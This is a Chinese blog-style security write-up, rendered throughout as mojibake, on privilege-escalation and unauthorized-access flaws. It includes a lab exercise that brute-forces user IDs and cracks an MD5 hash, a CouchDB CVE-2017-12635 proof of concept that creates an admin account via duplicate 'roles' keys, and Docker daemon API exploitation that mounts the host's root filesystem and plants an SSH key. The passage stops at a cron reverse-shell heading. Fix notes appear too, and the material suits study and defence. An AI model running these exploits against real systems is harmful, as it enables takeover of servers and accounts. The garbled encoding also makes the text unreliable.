æƒé™ç›¸å…³é€»è¾‘æ¼æ´æ˜¯é€»è¾‘æ¼æ´ä¸­å‡ºç°çš„æœ€å¤šçš„æ¼æ´ 1. å¹³è¡Œæƒé™è·¨è¶Š æ¼æ´ä»‹ç»ï¼šå³æ™®é€šç”¨æˆ·/ç®¡ç†å‘˜èƒ½è®¿é—®å…¶ä»–æ™®é€šç”¨æˆ·/ç®¡ç†å‘˜æ‰èƒ½å¤Ÿè®¿é—®çš„ç³»ç»Ÿä¿¡æ¯æˆ–è€…ç³»ç»ŸåŠŸèƒ½ å½¢æˆåŸå› ï¼šåœ¨è¿›è¡Œæ–¹æ³•è°ƒç”¨æ—¶å€™æœªè¿›è¡Œè¯·æ±‚ç”¨æˆ·å’Œç›®æ ‡ä¿¡æ¯æ‹¥æœ‰è€…æ˜¯å¦åŒ¹é…ä¸€è‡´ï¼Œç›´æ¥ç”¨userid/emailä¹‹ç±»çš„å®¹æ˜“éå†çš„å‚æ•°è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ æ¼æ´ç‚¹ï¼šåœ¨æ™®é€šç”¨æˆ·/ç®¡ç†å‘˜ç™»å½•åçš„èƒ½è®¿é—®çš„é“¾æ¥æˆ–è€…åŠŸèƒ½ä¸­éƒ½å¯èƒ½å­˜åœ¨ æ¼æ´ä¿®å¤ï¼š åœ¨æƒé™ç®¡ç†ä¸­ï¼Œå¹³è¡Œè¶Šæƒçš„æƒé™ç®¡ç†é¢—ç²’åº¦æœ€å° éœ€è¦åœ¨æ–¹æ³•ä¸­è¿›è¡Œç›¸å…³çš„è·å–è¯·æ±‚requestï¼Œå†åˆ©ç”¨getAttribute(â€œuseridâ€)è·å–å…¶useridï¼Œç›´æ¥ä½¿ç”¨è¯¥useridä½œä¸ºå‚æ•°è¿›è¡Œæ•°æ®å¢åˆ æŸ¥æ”¹ï¼Œé¿å…useridå‚æ•°ä¼ è¾“ æ¼æ´å¤ç° ç™»å½•ï¼ŒåŒæ—¶bpæŠ“åŒ…ï¼š æ”¾åŒ…ï¼Œå¯ä»¥çœ‹åˆ°å½“å‰çš„testç”¨æˆ·ï¼ˆè¿™é‡Œæ”¾åŒ…äº†å¾ˆå¤šæ¬¡â€¦ï¼‰ åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªcard_idå¯¹åº”çš„å°±æ˜¯æ¯ä¸ªç”¨æˆ·å¯¹åº”çš„id å‘é€åˆ°çˆ†ç ´æ¨¡å—éå†ä¸€ä¸‹ï¼Œè¿™é‡Œä»–æ˜¯å¯¹åä¸¤ä½è¿›è¡Œçš„éå† ç„¶åæ¥åˆ°ç™»å½•ç•Œé¢ï¼Œå³é”®æŸ¥çœ‹é©¬æ˜¥ç”Ÿçš„å›¾ç‰‡ï¼Œæ£€æŸ¥æºä»£ç å±æ€§ï¼šå‘ç°å…¶idå°¾å·ä»¥16ç»“å°¾ï¼Œæˆ‘ä»¬å¼€å§‹çˆ†ç ´ è¿™é‡Œå°±æ˜¯é©¬æ˜¥ç”Ÿçš„ä¸ªäººä¿¡æ¯ æˆ‘ä»¬å°†å¯†ç æ‹¿å»md5ç ´è§£ä¸€ä¸‹ éšåå‡­å€Ÿè¯¥ç”¨æˆ·åå’Œå¯†ç ç™»å½•å³å¯ï¼ŒæˆåŠŸæ‹¿åˆ°key æ¼æ´æ€»ç»“ å…ˆå…¬å¸ƒä¸€ä¸‹èƒŒæ™¯ é’»çŸ³ä»£ç†å•†é©¬æ˜¥ç”ŸåŒå­¦å·æ¬¾é€ƒè·‘ï¼Œå¤šä½ä¸‹çº§ä»£ç†å†…å¿ƒå—åˆ°äº†éš¾ä»¥ç£¨ç­çš„ä¼¤å®³ï¼Œä¸ºäº†æ‰¾åˆ°å¥¹æˆ‘ä»¬å°†é€šè¿‡ä»£ç†ç½‘ç«™è·å–åˆ°å¥¹çš„æ‰‹æœºå·ç ç­‰ä¿¡æ¯ã€‚ è¿™é‡Œæˆ‘ä¹Ÿæ˜¯è·Ÿç€æ•™ç¨‹åšçš„ï¼Œå› æ­¤å‡ ä¹æ²¡æœ‰è‡ªå·±çš„æ€è€ƒï¼Œä¸ºäº†ä¸æ‘¸é±¼ï¼Œè¿˜æ˜¯æµ…æµ…æ€»ç»“ä¸€ä¸‹ é¢˜ç›®å‘ŠçŸ¥æˆ‘ä»¬é‡ç‚¹æ˜¯é©¬æ˜¥ç”Ÿï¼Œé‚£æˆ‘ä»¬ä¾¿è¦å®ç°æ°´å¹³è¶Šæƒä»¥ä¾¿ä»¥é©¬æ˜¥ç”Ÿçš„ç”¨æˆ·ä¿¡æ¯ç™»å½•ç½‘ç«™ï¼Œé‚£æˆ‘ä»¬è¿›å…¥é¶åœºï¼ˆæˆ‘å°½å¯èƒ½çš„ä»¥å®æˆ˜çš„æ€è·¯æ¥å§ï¼‰ï¼Œé¦–å…ˆå°±æ˜¯æœé›†ä¿¡æ¯ï¼ŒburpæŠ“åŒ…ï¼ŒF12è¿™äº›è‚¯å®šæ˜¯å°‘ä¸äº†çš„ï¼Œè¿™é‡Œä¹Ÿæ˜¯å­¦åˆ°äº†ä¸€ç‚¹ä¸œè¥¿ï¼Œæœé›†ä¿¡æ¯å°¤ä¸ºé‡è¦ è¿™é‡Œåœ¨å®æˆ˜ä¸­å°±æ˜¯ä¼šè´¹æ—¶é—´ï¼Œè¿™é‡Œæˆ‘é™ˆè¿°çš„ä¹Ÿå°±æ˜¯å‡­å€Ÿç­”æ¡ˆæ¥é™ˆè¿°å§ï¼Œæ‰€ä»¥ä¼šå‚è€ƒæ€§ä½ä¸€äº› æˆ‘ä»¬burpæŠ“åŒ…ï¼Œç„¶åè§‚å¯ŸæŠ“åˆ°çš„ä¸œè¥¿ï¼Œä¸€æ¬¡æ¬¡æ”¾åŒ…æŸ¥çœ‹ä»€ä¹ˆæ—¶å€™ä¼šæœ‰é‡è¦ä¿¡æ¯ï¼Œéšåæˆ‘ä»¬åœ¨æ”¾åŒ…çš„è¿‡ç¨‹ä¸­ï¼Œå¾ˆå¹¸è¿åœ¨urlå¤´å‘ç°äº†æœ‰å…³è¯æ˜ç”¨æˆ·ä¿¡æ¯çš„idï¼Œå¹¶ä¸”è”ç³»æˆ‘ä»¬ä¹‹å‰å¯¹é¡µé¢çš„é‚£äº›å›¾ç‰‡çš„æŸ¥çœ‹ï¼Œå‘ç°å›¾ç‰‡çš„srcå¤„æœ‰ä¸€å †æ•°å­—ï¼Œè¿™ä¸æˆ‘ä»¬å‘ç°çš„ç”¨æˆ·idåŠå…¶ç›¸ä¼¼ï¼Œé‚£æˆ‘ä»¬æœ‰ç†ç”±æ¨æ–­é‚£å°±æ˜¯é©¬æ˜¥ç”ŸåŒå­¦çš„ç”¨æˆ·idï¼Œä½†æˆ‘ä»¬åªèƒ½äº†è§£åˆ°è¿™é‡Œï¼Œæƒ³è¦è·å–ä»–çš„ç”¨æˆ·åå¯†ç ä¾¿æ— ä»ä¸‹æ‰‹ï¼Œäºæ˜¯æˆ‘ä»¬é€šè¿‡burpçš„çˆ†ç ´æ¨¡å—ï¼Œå¯¹ç”¨æˆ·idåä¸¤ä½è¿›è¡Œéå†ï¼ŒæˆåŠŸåœ¨id=16å¤„ï¼ˆä¹Ÿå°±æ˜¯é©¬æ˜¥ç”ŸåŒå­¦çš„idï¼‰å‘ç°äº†é©¬æ˜¥ç”Ÿçš„è¯¦ç»†ä¸ªäººä¿¡æ¯ï¼Œè‡³æ­¤æˆ‘ä»¬æˆåŠŸå®ç°æ°´å¹³è¶Šæƒï¼ˆæœåŠ¡ç«¯æ²¡æœ‰å¯¹ç”¨æˆ·idåšå‡ºç²¾ç¡®çš„ç»´æŠ¤ï¼‰ 2. å‚ç›´æƒé™è·¨è¶Š æ¼æ´ä»‹ç»ï¼šå³æ™®é€šç”¨æˆ·èƒ½å¤Ÿè®¿é—®ç®¡ç†å‘˜ç”šè‡³è¶…çº§ç®¡ç†å‘˜æ‰èƒ½å¤Ÿè®¿é—®çš„ç³»ç»Ÿä¿¡æ¯æˆ–è€…ç³»ç»ŸåŠŸèƒ½ å½¢æˆåŸå› ï¼šç¨‹åºåœ¨æ–¹æ³•è°ƒç”¨æ—¶å€™ï¼Œç¼ºå°‘è§’è‰²ç­‰çº§æ ¡éªŒ æ¼æ´ç‚¹ï¼šåœ¨ä»»ä½•ç”¨æˆ·ç™»å½•åæ‰èƒ½è®¿é—®çš„é“¾æ¥æˆ–è€…åŠŸèƒ½ä¸­éƒ½å¯èƒ½å­˜åœ¨ å¯¹æ¯ä¸€ä¸ªä¼ è¾“çš„å‚æ•°éƒ½è¦äº†è§£å‚æ•°çš„ç›®çš„ï¼Œå°è¯•å°†ç”¨æˆ·åæ”¹ä¸ºadminå°è¯•ç»•è¿‡ æ¼æ´ä¿®å¤ï¼š éœ€è¦æ ¡éªŒç”¨æˆ·æ˜¯å¦æœ‰æƒé™è®¿é—®è¿™ä¸ªæ–¹æ³• è·å–è¯·æ±‚requestï¼Œå†åˆ©ç”¨getAuttribute(â€œroleidâ€)è·å–å…¶è§’è‰²ç­‰çº§ï¼Œæ£€æŸ¥è§’è‰²ç­‰çº§æ˜¯å¦åˆæ³•ï¼Œé”™è¯¯åˆ™ç›´æ¥è¿”å›é”™è¯¯è·³è½¬ï¼Œè¿”å›é¡µé¢å¿…é¡»ä»ç„¶ä»Attributeä¸­è·å–useridå†è¿›ä¸€æ­¥æŸ¥è¯¢ç›¸å…³ä¿¡æ¯ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯åˆ‡å‹¿å°†é”™è¯¯è·³è½¬å†™åˆ°Javascripté‡Œé¢ï¼Œè¿˜è¿”å›ç›®æ ‡URLé¡µé¢çš„ç›¸å…³ä¿¡æ¯ã€‚ Couchdb å‚ç›´è¶Šæƒï¼ˆCVE-2017-12635ï¼‰ Couchdbç®€ä»‹ Apache CouchDBæ˜¯ä¸€ä¸ªå¼€æºæ•°æ®åº“ï¼Œä¸“æ³¨äºæ˜“ç”¨æ€§å’Œæˆä¸º\"å®Œå…¨æ‹¥æŠ±webçš„æ•°æ®åº“\"ã€‚å®ƒæ˜¯ä¸€ä¸ªä½¿ç”¨JSONä½œä¸ºå­˜å‚¨æ ¼å¼ï¼ŒJavaScriptä½œä¸ºæŸ¥è¯¢è¯­è¨€ï¼ŒMapReduceå’ŒHTTPä½œä¸ºAPIçš„NoSQLæ•°æ®åº“ã€‚åº”ç”¨å¹¿æ³›ï¼Œå¦‚BBCç”¨åœ¨å…¶åŠ¨æ€å†…å®¹å±•ç¤ºå¹³å°ï¼ŒCredit Suisseç”¨åœ¨å…¶å†…éƒ¨çš„å•†å“éƒ¨é—¨çš„å¸‚åœºæ¡†æ¶ï¼ŒMeeboï¼Œç”¨åœ¨å…¶ç¤¾äº¤å¹³å°ï¼ˆwebå’Œåº”ç”¨ç¨‹åºï¼‰ã€‚ â€‹ åœ¨2017å¹´11æœˆ15æ—¥ï¼ŒCVE-2017-12635å’ŒCVE-2017-12636æŠ«éœ²ï¼ŒCVE-2017-12635æ˜¯ç”±äºErlangå’ŒJavaScriptå¯¹JSONè§£ææ–¹å¼çš„ä¸åŒï¼Œå¯¼è‡´è¯­å¥æ‰§è¡Œäº§ç”Ÿå·®å¼‚æ€§å¯¼è‡´çš„ã€‚è¿™ä¸ªæ¼æ´å¯ä»¥è®©ä»»æ„ç”¨æˆ·åˆ›å»ºç®¡ç†å‘˜ï¼Œå±äºå‚ç›´æƒé™ç»•è¿‡æ¼æ´ã€‚è¿™ä¸ªæ¼æ´å¯ä»¥è®©ä»»æ„ç”¨æˆ·åˆ›å»ºç®¡ç†å‘˜ï¼Œå±äºå‚ç›´æƒé™ç»•è¿‡æ¼æ´ã€‚ â€‹ å½±å“ç‰ˆæœ¬ï¼šApache CouchDB before 1.7.0 and 2.x before 2.1.1 æ¼æ´æˆå›  é—®é¢˜åœ¨äº Javascript JSON è§£æå™¨ï¼ˆåœ¨éªŒè¯è„šæœ¬ä¸­ä½¿ç”¨ï¼‰ä¸ CouchDB å†…éƒ¨ä½¿ç”¨çš„åä¸ºjiffyçš„è§£æå™¨ä¹‹é—´å­˜åœ¨å·®å¼‚ã€‚æŸ¥çœ‹æ¯ä¸ªå¯¹è±¡å¦‚ä½•å¤„ç†å¯¹è±¡ä¸Šçš„é‡å¤é”®ï¼Œä¾‹å¦‚ï¼š{\"foo\":\"bar\", \"foo\":\"baz\"} Erlangï¼š &gt; jiffy:decode(\"{\\\"foo\\\":\\\"bar\\\", \\\"foo\\\":\\\"baz\\\"}\"). {[{&lt;&lt;\"foo\"&gt;&gt;,&lt;&lt;\"bar\"&gt;&gt;},{&lt;&lt;\"foo\"&gt;&gt;,&lt;&lt;\"baz\"&gt;&gt;}]} JavaScriptï¼š &gt; JSON.parse(\"{\\\"foo\\\":\\\"bar\\\", \\\"foo\\\": \\\"baz\\\"}\") {foo: \"baz\"} å¯¹äºç»™å®šçš„é”®ï¼ŒErlang è§£æå™¨å°†å­˜å‚¨è¿™ä¸¤ä¸ªå€¼ï¼Œä½† Javascript è§£æå™¨å°†ä»…å­˜å‚¨æœ€åä¸€ä¸ªå€¼ã€‚ä¸å¹¸çš„æ˜¯ï¼ŒCouchDB æ•°æ®å†…éƒ¨è¡¨ç¤ºçš„ get_value å‡½æ•°åªä¼šè¿”å›ç¬¬ä¸€ä¸ªå€¼ï¼š % Within couch_util:get_value lists:keysearch(Key, 1, List). % keysearch(Key, N, TupleList) -&gt; {value, Tuple} | false % Searches the list of tuples TupleList for a tuple whose Nth element compares equal to Key. Returns {value, Tuple} if such a tuple is found, otherwise false. //åœ¨å…ƒç»„TupleListåˆ—è¡¨ä¸­æœç´¢å…¶ç¬¬nä¸ªå…ƒç´ æ¯”è¾ƒç­‰äºKeyçš„å…ƒç»„ã€‚å¦‚æœæ‰¾åˆ°è¿™æ ·çš„å…ƒç»„ï¼Œåˆ™è¿”å›{value, Tuple}ï¼Œå¦åˆ™è¿”å›falseã€‚ å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥ç»•è¿‡æ‰€æœ‰ç›¸å…³çš„è¾“å…¥éªŒè¯å¹¶åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼š curl -X PUT 'http://your-ip:5984/_users/org.couchdb.user:oops' --data-binary '{ \"type\": \"user\", \"name\": \"oops\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"password\" }' jsè§£æåªå­˜å‚¨ç¬¬äºŒä¸ªå€¼ï¼Œrolesä¸ºç©ºï¼Œæƒé™æ”¾è¡Œï¼›ä½†Eralangè§£æå™¨å°†è§£æå¹¶å­˜å‚¨ä¸¤ä¸ªå€¼ï¼Œä½†æ˜¯åœ¨CouchDBä¸­get_valueå‡½æ•°åªè¿”å›äº†jiffyæ‰€è§£æåˆ°çš„ç¬¬ä¸€ä¸ªé”®çš„å€¼ï¼Œå³adminï¼Œç®¡ç†å‘˜æƒé™ã€‚ æ³¨ï¼šé€šè¿‡æŸ¥çœ‹æºç ï¼Œæƒé™åˆ¤æ–­ä¸­ï¼Œåªè¦rolesé•¿åº¦å¤§äº0å°±è¿”å›forbiddenï¼Œåªæœ‰ç®¡ç†å‘˜æ‰èƒ½è¿›è¡Œä¿®æ”¹ã€‚ æ‰€ä»¥æ­¤POCæˆåŠŸç»•è¿‡jsçš„æ£€æŸ¥ï¼Œå¹¶æˆåŠŸè¢«erlangè§£æä¸ºç®¡ç†å‘˜è´¦æˆ·ã€‚ è¿›å…¥å®é™…ç¯å¢ƒä¸­ä¼šå‘ç”Ÿå¦‚ä¸‹èº«ä»½éªŒè¯è¿‡ç¨‹ï¼š JavaScriptåœ¨æ£€æµ‹æ—¶ï¼Œæ£€æµ‹æˆ‘ä»¬åˆ›å»ºçš„ç”¨æˆ·â€œè§’è‰²ï¼ï¼â€ã€‚æ— è§’è‰²ï¼Œä¹Ÿå°±ä¸å­˜åœ¨æƒé™ï¼Œæ‰€ä»¥æ²¡æœ‰å±å®³ï¼Œç³»ç»Ÿåˆ¤å®šä¸ºå®‰å…¨ï¼Œç»•è¿‡äº†æ£€æµ‹ã€‚æ¥ä¸‹æ¥åœ¨CouchDBçš„Erlangéƒ¨åˆ†å®ç°èº«ä»½éªŒè¯å’Œæˆæƒæ—¶ï¼Œjiffyå®ç°çš„æ—¶å€™ï¼Œgetterå‡½æ•°åªè¿”å›ç¬¬ä¸€ä¸ªå€¼ä¹Ÿå°±æ˜¯\"roles\": [â€œ_adminâ€],æ‰€ä»¥åˆ›å»ºå‡ºäº†å…·æœ‰adminæƒé™çš„è´¦æˆ·ã€‚ å¼€å§‹å¤ç° è®¿é—®é¦–é¡µå‘ç°æ˜¯jsonæ•°æ® æ¥ä¸‹æ¥è®¿é—®http://127.0.0.1:5984/_utils/ å‘ç° ç‚¹å‡»éªŒè¯æ•°æ®åº“æ­£ç¡®æ€§ï¼Œå‘ç°æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜æ— æƒæ“ä½œï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°è¯•ç›´æ¥åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ· æ¥ä¸‹æ¥ç”¨çš„æ˜¯ç½‘ä¸Šçš„pocï¼šç”¨putå‘é€ä¸€ä¸ªè¯·æ±‚åˆ›å»ºç®¡ç†å‘˜çš„æ•°æ®åŒ… PUT /_users/org.couchdb.user:hybcx HTTP/1.1 Host: 124.220.233.26:5984 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 108 { \"type\": \"user\", \"name\": \"hybcx\", \"roles\": [\"_admin\"], \"password\": \"hybcx\" } å…ˆç”¨bpæŠ“ä¸ªåŒ…ï¼Œå…¶å®æŠ“ä¸æŠ“éƒ½æ— æ‰€è°“ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨ç»ˆç«¯ä¸Šé€šè¿‡curlå‘é€putæ•°æ®åŒ… æ¥ä¸‹æ¥åœ¨bpä¸Šï¼Œè¾“å…¥ä¸Šè¿°pocï¼Œå¦‚ä¸‹å›¾å‘ç°æˆ‘ä»¬ä¸æ˜¯ç®¡ç†å‘˜ï¼Œæ— æƒåˆ›å»ºç®¡ç†å‘˜è´¦æˆ· ä½†å‘é€åŒ…å«ä¸¤ä¸ªrolesçš„æ•°æ®åŒ…ï¼Œå³å¯ç»•è¿‡é™åˆ¶ï¼Œåˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œè¿™é‡Œåˆ›å»ºäº†ä¸€ä¸ªè´¦æˆ·å¯†ç çš†ä¸ºhybcxçš„ç®¡ç†å‘˜è´¦æˆ·ï¼Œå‘é€å¦‚ä¸‹poc PUT /_users/org.couchdb.user:hybcx HTTP/1.1 Host: 124.220.233.26:5984 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Content-Type: application/json Content-Length: 108 { \"type\": \"user\", \"name\": \"hybcx\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"hybcx\" } å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æˆåŠŸåˆ›å»ºï¼Œç™»å½•éªŒè¯ä¸€ä¸‹ ä¹Ÿæ˜¯æˆåŠŸç™»é™† æ¼æ´ä¿®å¤ patchï¼šåŠ å…¥äº†dedupe_keyså­—æ®µç”¨äºå¯¹é‡å¤é”®çš„æ ‡è¯†ï¼Œé‡å†™äº†make_objectæ–¹æ³•ï¼Œä½¿å¾—jiffyè§£æJSONçš„æ–¹æ³•å’ŒJavaScriptä¸€è‡´ã€‚ ç»“è®ºï¼šå°½é‡ä¸ä½¿ç”¨å¤šä¸ªè§£æå™¨å¤„ç†ç›¸åŒçš„æ•°æ®ã€‚å¦‚æœé¡¹ç›®ä½¿ç”¨å¤šç§è¯­è¨€ï¼Œä¸å¯é¿å…å‘ç”Ÿè¿™ç§æƒ…å†µï¼Œåº”è¯¥ç¡®ä¿è§£æå™¨é—´æ²¡æœ‰åŠŸèƒ½å·®å¼‚ï¼Œå¦‚è¿™é‡ŒJSON è§£ææ ‡å‡†å°±æ²¡æœ‰æŒ‡å®šé‡å¤é”®çš„è¡Œä¸ºã€‚ å‚è€ƒæ–‡ç« ï¼šhttps://www.cnblogs.com/qweg/p/16574127.html 3. æœªç»æˆæƒè®¿é—® æ¼æ´ä»‹ç»ï¼šå³æ¸¸å®¢èƒ½å¤Ÿè®¿é—®æ™®é€šç”¨æˆ·ç”šè‡³è¶…çº§ç®¡ç†å‘˜æ‰èƒ½è®¿é—®çš„ç³»ç»Ÿä¿¡æ¯æˆ–è€…ç³»ç»ŸåŠŸèƒ½ å½¢æˆåŸå› ï¼šä¸»è¦æ˜¯ç³»ç»Ÿè®¾è®¡æœŸé—´æ²¡æœ‰è¿›è¡Œå…¨å±€ç”¨æˆ·èº«ä»½æ ¡éªŒï¼›æˆ–è€…æ ¡éªŒå­˜åœ¨ç¼ºé™· æ¼æ´ç‚¹ï¼šåœ¨ä»»ä½•ç”¨æˆ·ç™»å½•åæ‰èƒ½è®¿é—®çš„é“¾æ¥æˆ–è€…åŠŸèƒ½ä¸­éƒ½å¯èƒ½å­˜åœ¨ æ¼æ´ä¿®å¤ï¼š J2EEä¸­å­˜åœ¨filterï¼Œå¯ä»¥è·å–ç”¨æˆ·çš„cookieç­‰ä¿¡æ¯ ä¿®å¤æ€è·¯ï¼š å»ºç«‹LoginListï¼Œå€¼æ˜¯å½“å‰åœ¨çº¿ç”¨æˆ·çš„id å¯¹æ‰€æœ‰éœ€è¦ç™»å½•è®¿é—®åˆ°URLï¼Œè·å–è¯·æ±‚request å†åˆ©ç”¨ getAttribute(â€œuseridâ€) è·å–å…¶userid æ£€æŸ¥useridæ˜¯å¦å­˜åœ¨äºLoginListä¸­ï¼Œä¸å­˜åœ¨åˆ™ç›´æ¥è¿”å›é”™è¯¯è·³è½¬ å€¼å¾—æ³¨æ„çš„æ˜¯åˆ‡å‹¿å°†é”™è¯¯è·³è½¬å†™åˆ°Javascripté‡Œé¢ï¼Œè¿˜è¿”å›ç›®æ ‡URLé¡µé¢çš„ç›¸å…³ä¿¡æ¯ Docker daemon apiæœªæˆæƒè®¿é—®æ¼æ´ æ¼æ´ç®€ä»‹ Docker DaemonæŠŠæœåŠ¡æš´éœ²åœ¨tcpçš„2375ç«¯å£ä¸Šï¼Œè¿™æ ·å°±å¯ä»¥åœ¨ç½‘ç»œä¸Šæ“ä½œDockeräº†ã€‚Dockeræœ¬èº«æ²¡æœ‰èº«ä»½è®¤è¯çš„åŠŸèƒ½ï¼Œåªè¦ç½‘ç»œä¸Šèƒ½è®¿é—®åˆ°æœåŠ¡ç«¯å£ï¼Œå°±å¯ä»¥æ“ä½œDockerã€‚ä¸ä¸Šé¢çš„docker.sockæ–‡ä»¶åˆ©ç”¨ç±»ä¼¼ã€‚ ç®€å•æ¥è¯´ï¼šè¯¥æœªæˆæƒè®¿é—®æ¼æ´æ˜¯å› ä¸ºDocker APIå¯ä»¥æ‰§è¡ŒDockerå‘½ä»¤ï¼Œè¯¥æ¥å£æ˜¯ç›®çš„æ˜¯å–ä»£Dockerå‘½ä»¤ç•Œé¢ï¼Œé€šè¿‡URLæ“ä½œDockerã€‚ ç¯å¢ƒæ­å»º ä¸ºäº†æ›´è´´è¿‘å®æˆ˜ï¼Œæ‰€ä»¥ä¸ä½¿ç”¨vulhubæ­å»ºdockerï¼Œç›´æ¥åœ¨å®¿ä¸»æœºä¸Šç›´æ¥æ­å»ºã€‚ é¦–å…ˆè™šæ‹Ÿæœºåˆ›å»ºä¸€å°linuxï¼ˆcentos7ç‰ˆæœ¬ï¼‰ æœºå™¨æ­£å¸¸å®‰è£…å¥½docker æ¥ç€è¿›è¡Œæ–‡ä»¶å¤‡ä»½ï¼ˆä¸€ä¸‹å‡æ˜¯ä»¥rootèº«ä»½æ“ä½œï¼‰ cp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak æ¥ç€ç¼–è¾‘ vim /lib/systemd/system/docker.service æŠŠä¸‹é¢ä¸€æ®µä»£ç åŠ å…¥æ–‡ä»¶ç»“å°¾ [Service] ExecStart= ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘åï¼Œé‡è½½å®ˆæŠ¤è¿›ç¨‹ä»¥åŠé‡å¯Dockerï¼š systemctl daemon-reload` service docker restart é€šè¿‡æ‰§è¡Œå‘½ä»¤æŸ¥çœ‹æ˜¯å¦å¼€æ”¾äº†è¿œç¨‹è®¿é—®ç«¯å£ï¼š systemctl status docker.service å¦‚æœæœ¬åœ°æ­å»ºè®¿é—®ä¸äº†çš„è¯ï¼Œå¾ˆå¤§åŸå› æ˜¯å› ä¸ºé˜²ç«å¢™æœªæ”¾è¡Œ2375ç«¯å£ï¼Œæ”¾è¡Œç«¯å£åå°±å¯ä»¥åœ¨å…¶ä»–æœºå™¨è®¿é—®åˆ°äº† å¦‚ä½•åœ¨é˜²ç«å¢™å¼€å¯ä¸‹ï¼Œæ”¾è¡Œç«¯å£ä»¥è‡³äºå¤–éƒ¨å¯ä»¥è®¿é—® æ·»åŠ  firewall-cmd --zone=public --add-port=5005/tcp --permanent ï¼ˆ--permanentæ°¸ä¹…ç”Ÿæ•ˆï¼Œæ²¡æœ‰æ­¤å‚æ•°é‡å¯åå¤±æ•ˆï¼‰ æ·»åŠ ç«¯å£å¤–éƒ¨è®¿é—®æƒé™ï¼ˆè¿™æ ·å¤–éƒ¨æ‰èƒ½è®¿é—®ï¼‰ firewall-cmd --add-port=5005/tcp é‡æ–°è½½å…¥ï¼Œæ·»åŠ ç«¯å£åé‡æ–°è½½å…¥æ‰èƒ½èµ·ä½œç”¨ firewall-cmd --reload è¿™äº›ä¹‹åï¼Œç«¯å£æ˜¯å¼€å¯æˆåŠŸçš„ï¼Œå¦‚æœæ²¡æœ‰æˆåŠŸï¼Œé‡å¯ç³»ç»Ÿè¯•è¯•ã€‚ æ¼æ´æ£€æµ‹+åˆ©ç”¨ è®¿é—®192.168.4.92:2375/versionï¼Œè‹¥èƒ½è®¿é—®ï¼Œè¯æ˜å­˜åœ¨æœªæˆæƒè®¿é—®æ¼æ´ã€‚ ç›®æ ‡æœºï¼š192.168.4.92 æ”»å‡»æœºï¼š124.220.233.26 å†™å…¥å¯†é’¥å…å¯†ç™»é™† åœ¨å·²ç»å®‰è£…dockerçš„vpsä¸Šï¼Œä½¿ç”¨-Hå‚æ•°è¿æ¥ç›®æ ‡ä¸»æœºçš„dockerï¼Œä½¿ç”¨imageså‘½ä»¤æŸ¥è¯¢ç›®æ ‡ç³»ç»Ÿå­˜åœ¨çš„é•œåƒã€‚ ä½¿ç”¨dockerå‘½ä»¤åˆ›å»ºä¸€ä¸ªå®¹å™¨ï¼Œå¹¶å°†å®¿ä¸»æœºçš„ç£ç›˜æŒ‚è½½åˆ°å®¹å™¨ä¸­ docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt a98b9e39cc6d /bin/bash a98b9e39cc6d æ˜¯é•œåƒçš„ID è¿™æ¡å‘½ä»¤çš„æ„æ€æ˜¯å¯åŠ¨ä¸€ä¸ªimage ID ä¸ºa98b9e39cc6dçš„å®¹å™¨ï¼Œå¹¶ä¸”å°†è¯¥å®¿ä¸»æœºçš„æ ¹ç›®å½•æŒ‚åœ¨åˆ°å®¹å™¨çš„/mntç›®å½•ä¸‹ å¦‚æœç›®æ ‡æœºå™¨ä¸Šæ²¡æœ‰é•œåƒå°±éœ€è¦å…ˆpullä¸€ä¸ªé•œåƒåˆ°ç›®æ ‡æœºä¸Šã€‚ docker -H tcp://192.168.4.92:2375 pull busybox è¿™ä¸ªé•œåƒå¾ˆå°ï¼Œæ–¹ä¾¿ä¸‹è½½ã€‚ æœ‰é•œåƒä¹‹åå°±å¾ˆæ–¹ä¾¿åˆ©ç”¨äº†ã€‚ docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 /bin/bash docker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh //æ¢æˆshçš„åŸå› å¯èƒ½æ˜¯ï¼Œæˆ‘è¿™é‡Œç”¨çš„finalshellçš„sshè¿æ¥çš„ç›®æ ‡æœº docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 sh å¯åŠ¨ä¹‹åå°±ä¼šè·å¾—è¯¥å®¹å™¨å®¿ä¸»æœºçš„shell å› ä¸ºæˆ‘ä»¬æŠŠä¸»æœºçš„æ ¹ç›®å½•æŒ‚åœ¨åˆ°äº†è¿™ä¸ªå®¹å™¨çš„/mntå®¹å™¨ä¸‹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥å¾€ä¸»æœºçš„/root/.sshç›®å½•ä¸‹å†™authorized_keys æˆ‘ä»¬å°†æ”»å‡»æœºçš„å…¬é’¥å†™å…¥authorized_keys è¿™é‡Œæˆ‘ä¹‹å‰ç›®æ ‡æœºä¸kaliéƒ½æ²¡æœ‰å…¬é’¥ï¼Œäº§ç”Ÿå…¬é’¥å¯ä»¥å‚è€ƒæ–‡ç« ï¼šLinuxå®ç°sshå…å¯† æˆåŠŸå…å¯†ç™»é™†ç›®æ ‡æœåŠ¡å™¨ ssh root@192.168.4.92 å†™å…¥è®¡åˆ’ä»»åŠ¡åå¼¹shell å› ä¸ºdocker 